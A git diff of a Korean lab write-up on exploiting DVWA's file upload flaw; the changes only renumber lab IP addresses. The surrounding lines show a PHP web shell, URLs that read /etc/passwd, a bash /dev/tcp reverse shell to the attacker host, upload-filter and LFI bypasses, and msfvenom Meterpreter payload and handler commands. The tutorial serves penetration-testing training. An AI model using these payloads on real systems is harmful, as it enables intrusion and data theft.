@@ -20,8 +20,8 @@ mermaid: true
 
 | 항목 | 내용 |
 |---|---|
-| 공격 머신 | Kali Linux — `192.168.0.10` |
-| 대상 서버 | Ubuntu + DVWA — `192.168.0.30/DVWA/` |
+| 공격 머신 | Kali Linux — `192.168.56.10` |
+| 대상 서버 | Ubuntu + DVWA — `192.168.56.30/DVWA/` |
 | 주요 도구 | Burp Suite, Netcat, msfvenom, exiftool |
 
 ---
@@ -214,7 +214,7 @@ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 
 ### 3.2 DVWA에서 파일 업로드
 
-1. 브라우저에서 `http://192.168.0.30/DVWA/` 접속 후 로그인합니다.
+1. 브라우저에서 `http://192.168.56.30/DVWA/` 접속 후 로그인합니다.
 2. 좌측 메뉴 **File Upload** 를 클릭합니다.
 3. **Choose File** → `shell.php` 선택 → **Upload** 를 클릭합니다.
 4. 업로드 성공 시 다음 메시지와 함께 경로가 출력됩니다.
@@ -229,16 +229,16 @@ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 
 ```
 # 현재 실행 사용자 확인
-http://192.168.0.30/DVWA/hackable/uploads/shell.php?cmd=id
+http://192.168.56.30/DVWA/hackable/uploads/shell.php?cmd=id
 
 # 시스템 사용자명 확인
-http://192.168.0.30/DVWA/hackable/uploads/shell.php?cmd=whoami
+http://192.168.56.30/DVWA/hackable/uploads/shell.php?cmd=whoami
 
 # /etc/passwd 파일 읽기
-http://192.168.0.30/DVWA/hackable/uploads/shell.php?cmd=cat+/etc/passwd
+http://192.168.56.30/DVWA/hackable/uploads/shell.php?cmd=cat+/etc/passwd
 
 # 웹 루트 디렉토리 파일 목록 확인
-http://192.168.0.30/DVWA/hackable/uploads/shell.php?cmd=ls+-la+/var/www/html
+http://192.168.56.30/DVWA/hackable/uploads/shell.php?cmd=ls+-la+/var/www/html
 ```
 
 > 명령 실행 결과가 브라우저에 그대로 출력되면 RCE 성공입니다.
@@ -257,14 +257,14 @@ nc -lvnp 4444
 **2단계: WebShell을 통해 Reverse Shell 실행 (URL 인코딩 필요)**
 
 ```
-http://192.168.0.30/DVWA/hackable/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.0.10/4444+0>%261'
+http://192.168.56.30/DVWA/hackable/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.56.10/4444+0>%261'
 ```
 
 **3단계: Kali 터미널에서 연결 확인**
 
 ```
 listening on [any] 4444 ...
-connect to [192.168.0.10] from (UNKNOWN) [192.168.0.30] 49152
+connect to [192.168.56.10] from (UNKNOWN) [192.168.56.30] 49152
 bash: no job control in this shell
 www-data@ubuntu:/var/www/html/DVWA/hackable/uploads$
 ```
@@ -292,7 +292,7 @@ Medium 레벨은 서버가 `Content-Type` 헤더를 검사하여 `image/jpeg`, `
 
    ```http
    POST /DVWA/vulnerabilities/upload/ HTTP/1.1
-   Host: 192.168.0.30
+   Host: 192.168.56.30
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...
 
    ------WebKitFormBoundary...
@@ -356,7 +356,7 @@ High 레벨에서 확장자 검사가 엄격하여 `.php` 확장자 업로드 �
 
 ```
 # 업로드된 shell.gif를 LFI 취약점으로 include하여 PHP 코드 실행
-http://192.168.0.30/DVWA/vulnerabilities/fi/?page=../../hackable/uploads/shell.gif
+http://192.168.56.30/DVWA/vulnerabilities/fi/?page=../../hackable/uploads/shell.gif
 ```
 
 > GIF 시그니처가 포함된 파일이더라도 PHP include/require로 로드되면 PHP 코드가 실행됩니다.
@@ -393,7 +393,7 @@ exiftool로 EXIF에 PHP를 심어도 **재인코딩 과정에서 주석이 사�
 ```bash
 # PHP Meterpreter Reverse TCP 페이로드 생성
 msfvenom -p php/meterpreter/reverse_tcp \
-         LHOST=192.168.0.10 \
+         LHOST=192.168.56.10 \
          LPORT=4444 \
          -f raw > meterpreter.php
 ```
@@ -404,7 +404,7 @@ msfvenom -p php/meterpreter/reverse_tcp \
 # Metasploit 콘솔에서 핸들러 실행
 msfconsole -x "use exploit/multi/handler; \
                set payload php/meterpreter/reverse_tcp; \
-               set LHOST 192.168.0.10; \
+               set LHOST 192.168.56.10; \
                set LPORT 4444; \
                run"
 ```
@@ -412,12 +412,12 @@ msfconsole -x "use exploit/multi/handler; \
 ### 6.3 페이로드 업로드 및 실행
 
 1. `meterpreter.php` 파일을 DVWA File Upload에 업로드합니다.
-2. 브라우저로 업로드된 URL에 접근합니다: `http://192.168.0.30/DVWA/hackable/uploads/meterpreter.php`
+2. 브라우저로 업로드된 URL에 접근합니다: `http://192.168.56.30/DVWA/hackable/uploads/meterpreter.php`
 3. Metasploit 콘솔에서 Meterpreter 세션을 확인합니다.
 
 ```
-[*] Sending stage (39927 bytes) to 192.168.0.30
-[*] Meterpreter session 1 opened (192.168.0.10:4444 -> 192.168.0.30:49200)
+[*] Sending stage (39927 bytes) to 192.168.56.30
+[*] Meterpreter session 1 opened (192.168.56.10:4444 -> 192.168.56.30:49200)
 
 meterpreter > sysinfo
 Computer    : ubuntu
